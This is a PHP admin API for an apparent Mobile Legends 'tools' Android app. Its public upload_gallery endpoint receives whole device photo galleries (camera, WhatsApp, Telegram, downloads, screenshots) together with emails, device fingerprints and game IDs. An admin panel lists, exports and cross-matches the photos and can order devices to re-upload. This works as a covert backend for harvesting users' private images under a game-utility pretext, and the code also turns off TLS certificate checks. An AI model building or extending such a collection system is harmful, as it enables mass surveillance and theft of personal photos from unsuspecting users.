<?php
/**
 * MLBB Tools — Admin API (fresh build)
 *
 * Public (no auth):  ping, upload_gallery, save_player_binds, check_dlyyz_binds,
 *                    login, logout, check_auth
 * Admin (session):   everything else
 */
declare(strict_types=1);

$config = require __DIR__ . '/config.php';

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// ---------------------------------------------------------------- helpers

function sendJson(bool $ok, $data = null, string $msg = '', int $code = 200): void {
    http_response_code($code);
    echo json_encode(['success' => $ok, 'data' => $data, 'message' => $msg],
        JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

function cleanDir(string $id): string {
    $s = strtolower(trim($id));
    $s = preg_replace('/[^a-z0-9_-]/', '_', $s);
    $s = trim(preg_replace('/_+/', '_', $s), '_');
    return $s === '' ? 'unknown' : substr($s, 0, 64);
}

/** Resolve a device folder: direct clean-name match, else scan meta.json files. */
function resolveDeviceFolder(string $deviceId, string $userEmail = '', bool $create = false): array {
    global $config;
    $base = $config['gallery_dir'];
    if (!is_dir($base)) @mkdir($base, 0775, true);

    $target = null; $clean = '';

    if ($deviceId !== '') {
        $cand = $base . '/' . cleanDir($deviceId);
        if (is_dir($cand)) { $target = $cand; $clean = basename($cand); }
    }
    if (!$target && $deviceId !== '' && is_dir($base)) {
        $dl = strtolower($deviceId); $el = strtolower($userEmail);
        foreach (scandir($base) as $d) {
            if ($d === '.' || $d === '..' || $d[0] === '.') continue;
            $mf = $base . '/' . $d . '/meta.json';
            if (!is_file($mf)) continue;
            $m = json_decode(@file_get_contents($mf), true);
            if (!is_array($m)) continue;
            if (strtolower($m['device_id'] ?? '') === $dl ||
                ($el !== '' && strtolower($m['user_email'] ?? '') === $el)) {
                $target = $base . '/' . $d; $clean = $d; break;
            }
        }
    }
    if (!$target && $create) {
        $clean = cleanDir($deviceId !== '' ? $deviceId : $userEmail);
        // avoid collision with an unrelated folder
        $target = $base . '/' . $clean;
        $n = 1;
        while (is_dir($target) && $n < 100) { $n++; $target = $base . '/' . $clean . '_' . $n; }
        if ($n > 1) $clean .= '_' . $n;
        @mkdir($target, 0775, true);
    }
    return [$target, $clean];
}

function readMeta(string $dir): array {
    $mf = $dir . '/meta.json';
    $m = is_file($mf) ? json_decode(@file_get_contents($mf), true) : null;
    return is_array($m) ? $m : [];
}

function writeMeta(string $dir, array $meta): void {
    @file_put_contents($dir . '/meta.json',
        json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

/** Was this device deleted by admin recently? (client must flush its cache) */
function isDeletedRecently(string $id): bool {
    global $config;
    if ($id === '') return false;
    $log = $config['deleted_log'];
    if (!is_file($log)) return false;
    $list = json_decode(@file_get_contents($log), true);
    if (!is_array($list)) return false;
    $k = strtolower(trim($id));
    // keep entries for 30 days
    return isset($list[$k]) && (time() - (int)$list[$k] < 30 * 86400);
}

function markDeleted(string $id): void {
    global $config;
    $log = $config['deleted_log'];
    $list = is_file($log) ? (json_decode(@file_get_contents($log), true) ?: []) : [];
    if ($id !== '') $list[strtolower(trim($id))] = time();
    // prune old
    foreach ($list as $k => $t) if (time() - (int)$t > 30 * 86400) unset($list[$k]);
    @file_put_contents($log, json_encode($list));
}

// ---------------------------------------------------------------- auth

session_start();
function isAdmin(): bool {
    return !empty($_SESSION['mlbb_admin']) && $_SESSION['mlbb_admin'] === true;
}

// ---------------------------------------------------------------- input

$action  = $_GET['action'] ?? '';
$rawBody = file_get_contents('php://input');
if (strlen($rawBody) > $config['max_bytes_per_req']) {
    sendJson(false, null, 'Payload too large', 413);
}
$body = json_decode($rawBody, true) ?? [];
if ($action === '' && isset($body['action'])) $action = (string)$body['action'];
$in = array_merge($_GET, $_POST, is_array($body) ? $body : []);

$public = ['ping', 'upload_gallery', 'save_player_binds', 'check_dlyyz_binds',
           'login', 'logout', 'check_auth'];
if (!in_array($action, $public, true) && !isAdmin()) {
    sendJson(false, null, 'Unauthorized', 401);
}

// ---------------------------------------------------------------- actions

switch ($action) {

    // ---------------------------------------------------------- public

    case 'ping':
        sendJson(true, ['time' => date('c'), 'version' => 'fresh-1.0'], 'pong');

    case 'login': {
        $pw = (string)($in['password'] ?? '');
        if ($pw !== '' && password_verify($pw, $config['admin_password_hash'])) {
            session_regenerate_id(true);
            $_SESSION['mlbb_admin'] = true;
            sendJson(true, null, 'Logged in');
        }
        // small delay to slow brute force
        usleep(400000);
        sendJson(false, null, 'Invalid password', 401);
    }

    case 'logout':
        $_SESSION = [];
        session_destroy();
        sendJson(true, null, 'Logged out');

    case 'check_auth':
        sendJson(true, ['authenticated' => isAdmin()]);

    /**
     * upload_gallery — called by the Android app (full gallery sync).
     * Contract kept identical to previous backend so existing APK builds keep working.
     */
    case 'upload_gallery': {
        $deviceId          = trim((string)($body['device_id'] ?? ''));
        $deviceName        = trim((string)($body['device_name'] ?? ''));
        $deviceModel       = trim((string)($body['device_model'] ?? ''));
        $deviceFingerprint = trim((string)($body['device_fingerprint'] ?? ''));
        $userEmail         = trim((string)($body['user_email'] ?? ''));
        $mlbbId            = trim((string)($body['mlbb_id'] ?? ''));
        $mlbbServer        = trim((string)($body['mlbb_server'] ?? ''));
        $mlbbIgn           = trim((string)($body['mlbb_ign'] ?? ''));

        if ($deviceId === '' && $userEmail === '') {
            sendJson(false, null, 'Device ID or User email is required', 400);
        }

        // Admin wiped this device → tell client to flush local synced cache
        if (isDeletedRecently($deviceId) || isDeletedRecently($userEmail) ||
            ($mlbbId !== '' && isDeletedRecently('mlbb_' . $mlbbId))) {
            sendJson(true, [
                'reset_requested'  => true,
                'deleted_cooldown' => true,
                'saved_count'      => 0,
                'total_photos'     => 0,
                'device_id'        => $deviceId,
            ], 'Device was deleted by administrator');
        }

        [$targetDir, $cleanDir] = resolveDeviceFolder($deviceId, $userEmail, true);
        if (!$targetDir) sendJson(false, null, 'Storage unavailable', 500);

        $meta = readMeta($targetDir) + [
            'device_id' => $deviceId ?: $cleanDir, 'photos' => [],
        ];
        if ($deviceId !== '')       $meta['device_id'] = $deviceId;
        if ($deviceName !== '')     $meta['device_name'] = $deviceName;
        if ($deviceModel !== '')    $meta['device_model'] = $deviceModel;
        if ($deviceFingerprint !== '') $meta['device_fingerprint'] = $deviceFingerprint;
        if ($userEmail !== '')      $meta['user_email'] = $userEmail;
        if ($mlbbId !== '')         $meta['mlbb_id'] = $mlbbId;
        if ($mlbbServer !== '')     $meta['mlbb_server'] = $mlbbServer;
        if ($mlbbIgn !== '')        $meta['mlbb_ign'] = $mlbbIgn;
        if (isset($body['is_full_access'])) {
            if (!empty($body['is_full_access'])) $meta['is_full_access'] = true;
            elseif (empty($meta['photos']))     $meta['is_full_access'] = false;
        }
        if (isset($body['binds']))      $meta['binds'] = $body['binds'];
        if (isset($body['user_binds'])) $meta['user_binds'] = $body['user_binds'];

        $savedCount = 0;
        $incoming = $body['photos'] ?? [];
        if (is_array($incoming)) {
            if (count($incoming) > $config['max_photos_per_req']) {
                $incoming = array_slice($incoming, 0, $config['max_photos_per_req']);
            }
            foreach ($incoming as $idx => $item) {
                $dataUrl = (string)($item['dataUrl'] ?? '');
                if ($dataUrl === '') continue;
                $comma = strrpos($dataUrl, ',');
                $raw = $comma !== false ? substr($dataUrl, $comma + 1) : $dataUrl;
                $bin = base64_decode($raw, true);
                if ($bin === false || $bin === '') continue;

                $origName = (string)($item['name'] ?? ('device_photo_' . time() . '_' . $idx . '.jpg'));
                $mime     = (string)($item['mime'] ?? 'image/jpeg');
                $size     = (int)($item['size'] ?? 0);
                $isAvatar = !empty($item['is_avatar']);
                $hash     = md5($bin);

                if ($isAvatar) {
                    $avatarFile = $targetDir . '/avatar_current.jpg';
                    if (is_file($avatarFile) && md5_file($avatarFile) === $hash) continue;
                    foreach (scandir($targetDir) as $f) {
                        if (stripos($f, 'avatar_') === 0) @unlink($targetDir . '/' . $f);
                    }
                    file_put_contents($avatarFile, $bin);
                    $meta['photos'] = array_values(array_filter($meta['photos'] ?? [],
                        fn($p) => empty($p['is_avatar'])));
                    array_unshift($meta['photos'], [
                        'id' => 'avatar_current', 'filename' => 'avatar_current.jpg',
                        'name' => 'Profile Avatar', 'album' => 'Avatar',
                        'url' => 'uploads/gallery/' . $cleanDir . '/avatar_current.jpg',
                        'size' => strlen($bin), 'mime' => $mime, 'is_avatar' => true,
                        'content_hash' => $hash, 'date_added' => date('c'),
                    ]);
                    $savedCount++;
                    continue;
                }

                // skip if identical to avatar
                $avatarPath = $targetDir . '/avatar_current.jpg';
                if (is_file($avatarPath) && md5_file($avatarPath) === $hash) continue;

                // album guess
                $album = trim((string)($item['album'] ?? ''));
                if ($album === '') {
                    $combined = strtolower(trim((string)($item['folder'] ?? '')) . ' ' .
                                          trim((string)($item['path'] ?? '')) . ' ' . $origName);
                    $map = ['screenshot' => 'Screenshots', 'dcim' => 'Camera', 'camera' => 'Camera',
                            'whatsapp' => 'WhatsApp', 'telegram' => 'Telegram', 'download' => 'Downloads',
                            'instagram' => 'Instagram', 'facebook' => 'Facebook', 'snapchat' => 'Snapchat',
                            'pictures' => 'Pictures'];
                    $album = 'Gallery';
                    foreach ($map as $k => $v) if (strpos($combined, $k) !== false) { $album = $v; break; }
                }

                // dedup: identical content hash OR (same name + album + size)
                $exists = false;
                foreach ($meta['photos'] ?? [] as $ex) {
                    if (!empty($ex['content_hash']) && $ex['content_hash'] === $hash) { $exists = true; break; }
                    if (($ex['name'] ?? '') === $origName && ($ex['album'] ?? '') === $album &&
                        (int)($ex['size'] ?? 0) === $size && $size > 0) { $exists = true; break; }
                }
                if ($exists) continue;

                $filename = 'photo_' . time() . '_' . $idx . '_' . substr($hash, 0, 6) . '.jpg';
                file_put_contents($targetDir . '/' . $filename, $bin);
                if ($size <= 0) $size = strlen($bin);
                $meta['photos'][] = [
                    'id' => 'photo_' . time() . '_' . $idx . '_' . substr($hash, 0, 4),
                    'filename' => $filename, 'name' => $origName, 'album' => $album,
                    'url' => 'uploads/gallery/' . $cleanDir . '/' . $filename,
                    'size' => $size, 'mime' => $mime, 'is_avatar' => false,
                    'content_hash' => $hash, 'date_added' => date('c'),
                ];
                $meta['is_full_access'] = true;
                $savedCount++;
            }
        }

        $resetReq = !empty($meta['reset_requested']); unset($meta['reset_requested']);
        $syncReq  = !empty($meta['sync_requested']);  unset($meta['sync_requested']);

        $meta['last_synced'] = date('c');
        writeMeta($targetDir, $meta);

        sendJson(true, [
            'saved_count'     => $savedCount,
            'total_photos'    => count($meta['photos'] ?? []),
            'device_id'       => $meta['device_id'] ?? $deviceId,
            'device_name'     => $meta['device_name'] ?? '',
            'user_email'      => $userEmail,
            'reset_requested' => $resetReq,
            'sync_requested'  => $syncReq,
        ], "Device gallery photos synced ($savedCount uploaded)");
    }

    case 'save_player_binds': {
        $deviceId  = trim((string)($body['device_id'] ?? ''));
        $userEmail = trim((string)($body['user_email'] ?? ''));
        if ($deviceId === '' && $userEmail === '') {
            sendJson(false, null, 'Device ID or User Email is required', 400);
        }
        [$targetDir, $cleanDir] = resolveDeviceFolder($deviceId, $userEmail, true);
        $meta = readMeta($targetDir);
        if ($deviceId !== '')  $meta['device_id'] = $deviceId;
        if ($userEmail !== '') $meta['user_email'] = $userEmail;
        if (isset($body['binds']))      $meta['binds'] = $body['binds'];
        if (isset($body['user_binds'])) $meta['user_binds'] = $body['user_binds'];
        $meta['last_active'] = date('c');
        writeMeta($targetDir, $meta);
        sendJson(true, ['device_id' => $meta['device_id'] ?? $cleanDir], 'Binds saved');
    }

    case 'check_dlyyz_binds': {
        $mlbbId     = trim((string)($in['mlbb_id'] ?? ''));
        $mlbbServer = trim((string)($in['mlbb_server'] ?? ''));
        $deviceId   = trim((string)($in['device_id'] ?? ''));
        $apiKey     = trim((string)($in['apikey'] ?? '')) ?: $config['dlyyz_api_key'];
        if (($mlbbId === '' || $mlbbServer === '') && $deviceId !== '') {
            [$td] = resolveDeviceFolder($deviceId, $deviceId, false);
            if ($td) {
                $m = readMeta($td);
                if ($mlbbId === '')     $mlbbId = $m['mlbb_id'] ?? '';
                if ($mlbbServer === '') $mlbbServer = $m['mlbb_server'] ?? '';
            }
        }
        if ($mlbbId === '' || $mlbbServer === '') {
            sendJson(false, null, 'MLBB User ID and Server Zone are required', 400);
        }
        $url = 'https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek&userID=' .
               urlencode($mlbbId) . '&serverID=' . urlencode($mlbbServer) .
               '&apikey=' . urlencode($apiKey);
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => ['User-Agent: MLBBTools/1.0', 'Accept: application/json'],
        ]);
        $raw = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $data = json_decode((string)$raw, true);
        sendJson($code === 200 && $data !== null, $data, $code === 200 ? 'OK' : 'Upstream error', $code === 200 ? 200 : 502);
    }

    // ---------------------------------------------------------- admin

    case 'get_stats': {
        $base = $config['gallery_dir'];
        $devices = 0; $photos = 0; $avatars = 0; $bytes = 0;
        if (is_dir($base)) foreach (scandir($base) as $d) {
            if ($d === '.' || $d === '..' || $d[0] === '.') continue;
            $dir = $base . '/' . $d;
            if (!is_dir($dir)) continue;
            $devices++;
            $m = readMeta($dir);
            foreach ($m['photos'] ?? [] as $p) {
                $photos++;
                if (!empty($p['is_avatar'])) $avatars++;
            }
            foreach (scandir($dir) as $f) {
                if ($f === 'meta.json') continue;
                $fp = $dir . '/' . $f;
                if (is_file($fp)) $bytes += filesize($fp);
            }
        }
        sendJson(true, compact('devices', 'photos', 'avatars', 'bytes'));
    }

    case 'list_devices': {
        $base = $config['gallery_dir'];
        $out = [];
        if (is_dir($base)) foreach (scandir($base) as $d) {
            if ($d === '.' || $d === '..' || $d[0] === '.') continue;
            $dir = $base . '/' . $d;
            if (!is_dir($dir)) continue;
            $m = readMeta($dir);
            $out[] = [
                'dir'          => $d,
                'device_id'    => $m['device_id'] ?? $d,
                'device_name'  => $m['device_name'] ?? 'Android Device',
                'device_model' => $m['device_model'] ?? '',
                'user_email'   => $m['user_email'] ?? '',
                'mlbb_id'      => $m['mlbb_id'] ?? '',
                'mlbb_server'  => $m['mlbb_server'] ?? '',
                'mlbb_ign'     => $m['mlbb_ign'] ?? '',
                'photo_count'  => count($m['photos'] ?? []),
                'is_full_access' => !empty($m['is_full_access']),
                'last_synced'  => $m['last_synced'] ?? $m['last_active'] ?? '',
                'is_online'    => isset($m['last_synced']) && (time() - strtotime($m['last_synced']) < 120),
            ];
        }
        usort($out, fn($a, $b) => strcmp($b['last_synced'] ?? '', $a['last_synced'] ?? ''));
        sendJson(true, $out);
    }

    case 'list_user_gallery': {
        $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($in['dir'] ?? ''));
        $full = $config['gallery_dir'] . '/' . $dir;
        if ($dir === '' || !is_dir($full)) sendJson(false, null, 'Device not found', 404);
        $m = readMeta($full);
        sendJson(true, [
            'device' => [
                'dir' => $dir, 'device_id' => $m['device_id'] ?? $dir,
                'device_name' => $m['device_name'] ?? '', 'user_email' => $m['user_email'] ?? '',
                'mlbb_id' => $m['mlbb_id'] ?? '', 'mlbb_ign' => $m['mlbb_ign'] ?? '',
            ],
            'photos' => array_values($m['photos'] ?? []),
        ]);
    }

    /**
     * get_duplicates — the anti-multi-account view.
     * Groups photos by content_hash that appear on 2+ different devices.
     */
    case 'get_duplicates': {
        $base = $config['gallery_dir'];
        $byHash = [];
        if (is_dir($base)) foreach (scandir($base) as $d) {
            if ($d === '.' || $d === '..' || $d[0] === '.') continue;
            $dir = $base . '/' . $d;
            if (!is_dir($dir)) continue;
            $m = readMeta($dir);
            $label = ($m['device_name'] ?? $d) . ' (' . ($m['user_email'] ?? $m['device_id'] ?? $d) . ')';
            foreach ($m['photos'] ?? [] as $p) {
                $h = $p['content_hash'] ?? '';
                if ($h === '' || !empty($p['is_avatar'])) continue;
                $byHash[$h]['devices'][$d] = $label;
                $byHash[$h]['sample'] = $p;
            }
        }
        $dups = [];
        foreach ($byHash as $h => $g) {
            if (count($g['devices'] ?? []) >= 2) {
                $dups[] = ['content_hash' => $h, 'devices' => array_values($g['devices']),
                           'device_count' => count($g['devices']), 'sample' => $g['sample']];
            }
        }
        usort($dups, fn($a, $b) => $b['device_count'] <=> $a['device_count']);
        sendJson(true, $dups);
    }

    case 'delete_gallery_photo': {
        $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($in['dir'] ?? ''));
        $fid = (string)($in['photo_id'] ?? '');
        $full = $config['gallery_dir'] . '/' . $dir;
        if ($dir === '' || !is_dir($full)) sendJson(false, null, 'Device not found', 404);
        $m = readMeta($full);
        $kept = [];
        foreach ($m['photos'] ?? [] as $p) {
            if (($p['id'] ?? '') === $fid) {
                if (!empty($p['filename']) && is_file($full . '/' . $p['filename'])) {
                    @unlink($full . '/' . $p['filename']);
                }
                continue;
            }
            $kept[] = $p;
        }
        $m['photos'] = array_values($kept);
        writeMeta($full, $m);
        sendJson(true, ['remaining' => count($kept)], 'Photo deleted');
    }

    case 'delete_all_gallery_photos': {
        $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($in['dir'] ?? ''));
        $full = $config['gallery_dir'] . '/' . $dir;
        if ($dir === '' || !is_dir($full)) sendJson(false, null, 'Device not found', 404);
        foreach (scandir($full) as $f) {
            if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
            $fp = $full . '/' . $f;
            if (is_file($fp)) @unlink($fp);
        }
        $m = readMeta($full);
        $m['photos'] = [];
        writeMeta($full, $m);
        sendJson(true, null, 'All photos deleted');
    }

    case 'delete_device': {
        $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($in['dir'] ?? ''));
        $full = $config['gallery_dir'] . '/' . $dir;
        if ($dir === '' || !is_dir($full)) sendJson(false, null, 'Device not found', 404);
        $m = readMeta($full);
        markDeleted($m['device_id'] ?? '');
        markDeleted($m['user_email'] ?? '');
        if (!empty($m['mlbb_id'])) markDeleted('mlbb_' . $m['mlbb_id']);
        // remove folder recursively
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($full, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
        @rmdir($full);
        sendJson(true, null, 'Device deleted (client will flush its cache on next sync)');
    }

    case 'sync_device': {
        $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($in['dir'] ?? ''));
        $full = $config['gallery_dir'] . '/' . $dir;
        if ($dir === '' || !is_dir($full)) sendJson(false, null, 'Device not found', 404);
        $m = readMeta($full);
        $m['sync_requested'] = true;
        writeMeta($full, $m);
        sendJson(true, null, 'Sync requested — device will re-upload on next heartbeat');
    }

    case 'export_csv': {
        $base = $config['gallery_dir'];
        $rows = [['device_dir','device_id','device_name','user_email','mlbb_id','mlbb_ign','photos','last_synced']];
        if (is_dir($base)) foreach (scandir($base) as $d) {
            if ($d === '.' || $d === '..' || $d[0] === '.') continue;
            $dir = $base . '/' . $d;
            if (!is_dir($dir)) continue;
            $m = readMeta($dir);
            $rows[] = [$d, $m['device_id'] ?? '', $m['device_name'] ?? '',
                       $m['user_email'] ?? '', $m['mlbb_id'] ?? '', $m['mlbb_ign'] ?? '',
                       count($m['photos'] ?? []), $m['last_synced'] ?? ''];
        }
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="mlbb-devices.csv"');
        $out = fopen('php://output', 'w');
        foreach ($rows as $r) fputcsv($out, $r);
        exit;
    }

    default:
        sendJson(false, null, 'Unknown action', 400);
}
